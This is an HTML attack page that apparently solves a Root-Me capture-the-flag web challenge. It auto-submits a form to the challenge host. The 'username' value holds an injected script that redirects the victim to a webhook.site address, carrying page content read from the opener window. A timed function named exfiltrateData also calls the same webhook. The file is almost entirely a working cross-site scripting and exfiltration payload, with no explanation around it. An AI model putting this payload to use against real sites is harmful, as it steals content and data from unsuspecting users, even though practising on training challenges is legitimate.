<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Second window</title>
</head>
<body>

<h1>Page 2</h1>
<form method="POST" action="http://challenge01.root-me.org:58003/login">
    <input type="text" name="username" value="<script>window.location='https://webhook.site/339f0497-f8d9-43af-9508-3b65ed3f0873?g6g='+encodeURI(window.opener.document.querySelectorAll('section>p')[2].innerHTML);</script>">
    <input type="text" name="secret" value="FAILED">
    <input type="submit">
</form>
<script>
    window.opener.postMessage({redirect: "go"}, "*");
    setTimeout(() => exfiltrateData(), 3000)

        function exfiltrateData() {
            fetch("https://webhook.site/339f0497-f8d9-43af-9508-3b65ed3f0873?g6g=end-1")
            document.querySelector("form").submit()
        };

</script>

</body>
</html>